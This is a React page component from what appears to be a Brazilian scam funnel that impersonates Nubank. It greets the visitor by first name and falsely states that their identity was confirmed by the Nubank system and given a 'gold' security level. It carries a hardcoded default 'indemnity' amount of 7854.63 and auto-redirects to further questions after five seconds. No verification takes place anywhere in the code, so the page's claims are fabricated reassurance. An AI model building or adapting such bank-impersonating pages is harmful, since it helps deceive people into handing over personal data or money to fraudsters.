import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';
import { Shield, CheckCircle2 } from 'lucide-react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import UserMenu from '../components/UserMenu';
import { navigateWithParams } from '../utils/urlParams';

export default function AccountVerifiedPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const funnelData = getFunnelData();
  const { userData: stateUserData, indemnityAmount: stateIndemnityAmount, urlParams } = location.state || {};
  const userData = stateUserData || funnelData.userData;
  const indemnityAmount = stateIndemnityAmount || 7854.63;
  const [isMenuOpen, setIsMenuOpen] = useState(false);

  const handleContinue = () => {
    navigateWithParams(
      navigate,
      '/perguntas-perfil',
      location,
      {
        userData,
        indemnityAmount
      }
    );
  };

  useEffect(() => {
    if (!userData) {
      navigate('/');
      return;
    }

    saveFunnelData({
      userData: userData,
      currentStep: '/conta-verificada'
    });

    const timer = setTimeout(() => {
      navigateWithParams(
        navigate,
        '/perguntas-perfil',
        location,
        {
          userData,
          indemnityAmount
        }
      );
    }, 5000);

    return () => clearTimeout(timer);
  }, [navigate, userData, indemnityAmount, urlParams]);

  if (!userData) {
    return null;
  }

  const firstName = userData.nome.split(' ')[0];

  const handleMenuClick = () => {
    setIsMenuOpen(!isMenuOpen);
  };

  const handleMenuClose = () => {
    setIsMenuOpen(false);
  };

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex flex-col">
      <Header showUserIcon={true} onMenuClick={handleMenuClick} />
      <UserMenu isOpen={isMenuOpen} onClose={handleMenuClose} userName={firstName} />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6 md:p-8 pt-24 sm:pt-28 pb-20">
        <div className="w-full max-w-sm sm:max-w-md">
          <div className="text-center animate-scale-in">
            <div className="flex justify-center mb-5 sm:mb-6 animate-bounce-in">
              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-green-50 rounded-full flex items-center justify-center">
                <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-green-600" />
              </div>
            </div>

            <h1 className="text-lg sm:text-xl font-semibold text-gray-900 mb-3 px-2 animate-fade-in-down">
              Bem-vindo(a) à sua Conta Nubank
            </h1>

            <p className="text-sm sm:text-base text-gray-600 mb-5 sm:mb-6 animate-fade-in-delayed">
              Olá, <span className="font-semibold text-purple-600">{firstName}</span>!
            </p>

            <div className="bg-green-50 border-2 border-green-500 rounded-xl p-4 mb-4 sm:mb-5 animate-slide-in-up">
              <div className="flex items-center justify-center mb-2">
                <CheckCircle2 className="w-5 h-5 text-green-600 mr-2" />
                <h2 className="text-sm sm:text-base font-semibold text-green-900">
                  CONTA VALIDADA
                </h2>
              </div>
              <p className="text-xs text-green-800 px-2">
                Sua identidade foi confirmada com sucesso pelo sistema Nubank
              </p>
            </div>

            <div className="bg-purple-50 border border-purple-200 rounded-xl p-3 sm:p-4 mb-5 sm:mb-6 animate-slide-in-up-delayed">
              <div className="flex items-start">
                <div className="w-5 h-5 sm:w-6 sm:h-6 bg-purple-600 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                  <span className="text-white text-xs font-semibold">i</span>
                </div>
                <div className="ml-2 sm:ml-3 text-left">
                  <p className="text-xs sm:text-sm font-semibold text-purple-600 mb-1">
                    Nível de Segurança: OURO
                  </p>
                  <p className="text-xs sm:text-sm text-purple-600">
                    Máximo nível de confiança para transações financeiras
                  </p>
                </div>
              </div>
            </div>

            <button
              onClick={handleContinue}
              className="w-full bg-purple-600 hover:bg-purple-700 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-200 shadow-md text-sm animate-slide-in-up-delayed-2"
            >
              Continuar Consulta
            </button>
          </div>
        </div>
      </main>

      <Footer />

      <style>{`
        @keyframes scale-in {
          from {
            opacity: 0;
            transform: scale(0.95);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }
        .animate-scale-in {
          animation: scale-in 0.4s ease-out;
        }

        @keyframes bounce-in {
          0% {
            opacity: 0;
            transform: scale(0);
          }
          50% {
            transform: scale(1.1);
          }
          100% {
            opacity: 1;
            transform: scale(1);
          }
        }
        .animate-bounce-in {
          animation: bounce-in 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) 0.2s backwards;
        }

        @keyframes fade-in-down {
          from {
            opacity: 0;
            transform: translateY(-15px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-fade-in-down {
          animation: fade-in-down 0.5s ease-out 0.3s backwards;
        }

        @keyframes fade-in-delayed {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-fade-in-delayed {
          animation: fade-in-delayed 0.5s ease-out 0.4s backwards;
        }

        @keyframes slide-in-up {
          from {
            opacity: 0;
            transform: translateY(20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-slide-in-up {
          animation: slide-in-up 0.5s ease-out 0.5s backwards;
        }

        .animate-slide-in-up-delayed {
          animation: slide-in-up 0.5s ease-out 0.6s backwards;
        }

        .animate-slide-in-up-delayed-2 {
          animation: slide-in-up 0.5s ease-out 0.7s backwards;
        }
      `}</style>
    </div>
  );
}
